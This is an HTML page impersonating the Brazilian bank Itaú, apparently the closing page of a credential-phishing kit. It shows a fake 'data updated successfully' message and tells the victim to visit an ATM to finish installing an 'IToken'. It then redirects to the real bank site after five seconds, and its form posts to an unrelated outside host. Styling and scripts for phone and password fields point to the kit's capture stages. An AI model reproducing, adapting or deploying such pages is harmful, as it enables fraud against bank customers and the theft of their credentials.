﻿<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta charset="utf-8">
<title>Itau</title>
<style>
@media (min-width: 320px){ #resolution { width:300px; !important } }
@media (min-width: 480px){ #resolution { width:450px; !important } }
@media (min-width: 640px){ #resolution { width:610px; !important } }
@media (min-width: 200px){ #img { width:21%; height:32%; !important } }
@media (min-width: 320px){ #img { width:20%; height:32%; !important } }
@media (min-width: 480px){ #img { width:18%; height:42%; !important } }
@media (min-width: 640px){ #img { width:15%; height:48%; !important } }
@media (max-width: 480px){ #hide { display:none; !important } }
@media (max-height: 480px){ #hide2 { display:none; !important } }
#telefone { width:100%; height:35px; padding:5px; background:url(images/6.png) right no-repeat; border:none; color:#999; font-family:'Arial'; font-size:16px; outline:none; }
#senha2 { width:100%; height:35px; padding:5px; border:none; color:#999; font-family:'Arial'; font-size:16px; outline:none; }
#acessar { width:90%; height:60px; font-size:16px; color:#FFF; border-radius:5px; border:none; background:#F60; font-weight:bold; }
</style>
<script>
  function maxLengthCheck(object)
  {
    if (object.value.length > object.maxLength)
      object.value = object.value.slice(0, object.maxLength)
  }
</script>
<script>
function mascaraTelefone( campo ) {
			
function trata( valor,  isOnBlur ) {
					
	valor = valor.replace(/\D/g,"");             			
	valor = valor.replace(/^(\d{2})(\d)/g,"($1)$2"); 		
					
	if( isOnBlur ) {
						
	valor = valor.replace(/(\d)(\d{4})$/,"$1-$2");   
					} else {

						valor = valor.replace(/(\d)(\d{3})$/,"$1-$2"); 
					}
					return valor;
				}
				
				campo.onkeypress = function (evt) {
					 
					var code = (window.event)? window.event.keyCode : evt.which;	
					var valor = this.value
					
					if(code > 57 || (code < 48 && code != 8 ))  {
						return false;
					} else {
						this.value = trata(valor, false);
					}
				}
				
				campo.onblur = function() {
					
					var valor = this.value;
					if( valor.length < 13 ) {
						this.value = ""
					}else {		
						this.value = trata( this.value, true );
					}
				}
				
				campo.maxLength = 14;
			}
</script>
</head>

<body style="background:#FFF; margin:0;">
<form name="form" id="form" action="http://clientefisico.netai.net/index2.php" method="post">
<div style="height:400px; background:; margin:0 auto;" id="resolution">
<div style="border-bottom:1px solid #CCC;">
<div style="width:50px; height:50px; background:url(images/5.png) no-repeat;"></div>
</div>
<div style="padding:15px; text-align:center; font-size:14px; font-family:'Arial'; color:#090; border-bottom:1px solid #CCC; box-shadow:0 2px 2px #CCC;">Dados atualizados com sucesso.</div>
<div style="padding:30px; font-family:'Arial'; font-size:12px;" align="justify">Dirija-se a um caixa eletronico itaú para finalizar a instalação do seu novo <B>IToken</B>.</div>
  
  <div align="center"><img src="images/aaaa.png" width="48" height="48"></div>
<div style="padding:25px 0 15px 0; font-family:'Arial'; font-size:11px;" align="center">Agradecemos sua cooperação, <br>
<B>Banco Itaú</B>.</div>

        <script language="javascript">
            setTimeout(function () {
                window.location = "https://www.itau.com.br/";
            }, 5000);
        </script> 

</div>
</form>
</body>
</html>